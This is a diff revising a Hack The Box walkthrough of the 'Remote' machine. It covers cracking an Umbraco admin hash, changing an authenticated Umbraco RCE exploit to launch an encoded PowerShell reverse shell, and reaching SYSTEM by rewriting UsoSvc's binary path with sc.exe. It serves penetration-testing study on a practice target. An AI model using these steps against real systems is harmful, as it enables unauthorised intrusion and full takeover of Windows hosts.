@@ -140,7 +140,7 @@ So let's try grepping for information directly from the file. As Umbraco.sdf is 
 
 Umbraco uses HMACSHA1 which produces 160-bit hashes usually stored as a 40-digit hex string.
 
-Hence, we grep for the regular expression containing at least 40 characters from the hex character set `[0-9a-f]`.
+Hence, we grep for the regular expression containing at least 40 characters from the [hex character set](https://stackoverflow.com/questions/15789005/how-to-grep-for-a-7-digit-hexadecimal-string-and-return-only-that-hexadecimal-st) `[0-9a-f]`.
 
 ```
 root@kali:~/htb/remote# strings Umbraco.sdf | egrep '[0-9a-f]{40}'
@@ -167,7 +167,7 @@ We can also use a online hash cracker like [Crack Station](https://crackstation.
 Now we have a set of credentials that we can try to login with.
 
 * username:admin@htb.local
-* password:baconandcheeseo
+* password:baconandcheese
 
 ![Umbraco version](/images/remote/umbracocms.jpg)
 
@@ -177,7 +177,7 @@ We have logged on successfully.
 
 ## Attacks and Exploits
 
-### Umbraco Exploit
+### Getting The Umbraco Exploit
 
 This is a RCE vulnerability that requires a login which we have now.
 
@@ -187,7 +187,7 @@ The exploit is very well-documented, you can look through it to understand what 
 
 There's also a Metasploit module listed but we are doing this without Metasploit.
 
-#### Verifying The Exploit
+### Verifying The Exploit
 
 Let's verify that the exploit is working with a simple command (like ping or id). It makes for easier troubleshooting.
 
@@ -202,7 +202,7 @@ proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = 
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }
 ```
 
-We also need to replace the username and password with the credentials we've obtained.
+We also need to replace the **username** and **password** with the credentials we've obtained.
 
 In another terminal window, let's listen for pings using `tcpdump`. After executing the exploit, we receive pings from 10.10.10.180.
 
@@ -216,7 +216,7 @@ listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 22:44:03.445072 IP kali > 10.10.10.180: ICMP echo reply, id 1, seq 1, length 40
 ```
 
-#### Encoding Our Payload
+### Encoding Our Payload
 
 From [this page](https://delta.navisec.io/reverse-shell-reference/#powershell), we find a nice reverse shell code for powershell.
 
@@ -230,18 +230,17 @@ The payload code (as it is) will break the XSLT file. So let's base64 encode it.
 * `psreverse.txt` stores a copy of our reverse shell
 * `iconv` converts the format from UTF8 to UTF16LE, as [Windows uses UTF16 (Little Endian) by default](https://en.wikipedia.org/wiki/UTF-16)
 
-#### Modifying The Exploit
+### Modifying The Exploit
 
 Changes we need to make:
 
-* `string cmd = "-encoded <base64stringofreverseshell>";`
+* `string cmd = "-encoded <insertbase64stringofreverseshell>";`
 * `proc.StartInfo.Filename = "powershell.exe";`
 
-https://ridicurious.com/2018/05/28/encoded-commands/
+These changes will get [powershell to execute a base64 encoded command](https://ridicurious.com/2018/05/28/encoded-commands/).
 
-#### Exploiting
+### Exploiting
 
-replace login password host
 After executing the exploit with the modified payload, we get a reverse shell from Remote.
 
 ```
@@ -297,9 +296,9 @@ RW UsoSvc
 	SERVICE_ALL_ACCESS
 ```
 
-`SERVICE_ALL_ACCESS` means that we have full access to the service including the ability to change its configuration and restart it. [More information on service access.](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)
+`SERVICE_ALL_ACCESS` means that we have full access to UsoSvc including the ability to change its configuration and restart it. [More information on service access.](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)
 
-Let's check the configuration of UsoSvc.
+Let's check the configuration of UsoSvc. We can do this using the [Service Control command-line tool (sc.exe)](https://ss64.com/nt/sc.html).
 
 ```
 PS C:\windows\temp> sc.exe qc UsoSvc
@@ -316,6 +315,10 @@ SERVICE_NAME: UsoSvc
         DEPENDENCIES       : rpcss
         SERVICE_START_NAME : LocalSystem
 ```
+
+UsoSvc is the Update Orchestrator Service. It is a Windows service that downloads, installs, and verifies updates. Given that it arranges updates, it runs as `LocalSystem`. [Learn more about this CVE here.](https://www.nccgroup.trust/sg/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/)
+
+We have full access over a service that runs as system. Sounds fun?
 
 When exploiting weak service permissions, the **BINARY_PATH_NAME** is of particular interest to us. This is because this path is executed whenever the service is started.
 
@@ -357,9 +360,11 @@ PS C:\windows\temp> sc.exe start UsoSvc
 The service did not respond to the start or control request in a timely fashion.
 ```
 
-The service failed to start because the binary path has been changed by us, so that's not surprising. But was our shell binary executed successfully?
+The service failed to start because the binary path has been changed by us, so that's not surprising.
 
-Yes it did. We received a system shell on our handler.
+But did it execute successfully?
+
+Yes it did.
 
 ```
 root@kali:~/htb/remote# nc -nvlp 5555
@@ -373,16 +378,10 @@ whoami
 nt authority\system
 ```
 
-If you want to use metasploit, use the module `exploit/windows/local/service_permissions`.
+If you want to use Metasploit for exploiting weak service permissions, use the module `exploit/windows/local/service_permissions`.
 
 ## Ending Thoughts
 
 I've rooted a number of active boxes before this. But this is the first active box I've rooted without referring to the forum.
 
-I learned over time that
-
-gaps
-uncover umbraco and login page
-explain sc
-explain what is UsoSvc
-https://stackoverflow.com/questions/15789005/how-to-grep-for-a-7-digit-hexadecimal-string-and-return-only-that-hexadecimal-st
+However, I did use Metasploit for privilege escalation the first time round, before learning to exploiting the same vulnerability manually with the help of accesschk. (I try to avoid Metasploit use as OSCP restricts it.) 
